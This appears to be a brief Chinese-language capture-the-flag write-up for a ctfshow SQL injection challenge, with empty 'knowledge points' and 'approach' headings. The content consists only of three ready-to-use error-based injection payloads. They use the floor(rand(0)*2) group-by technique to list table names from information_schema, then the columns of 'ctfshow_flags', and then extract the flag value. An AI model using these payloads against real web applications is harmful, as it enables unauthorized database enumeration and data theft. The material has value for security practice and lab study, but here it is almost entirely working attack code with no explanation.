# 知识点
# 思路
```plsql
#获取表名
1' union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database()  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

#获取列名
1' union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name='ctfshow_flags'  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

#获取数据
1' union select 1,count(*),concat(0x3a,0x3a,(select (flag2) from ctfshow_flags  limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23


```
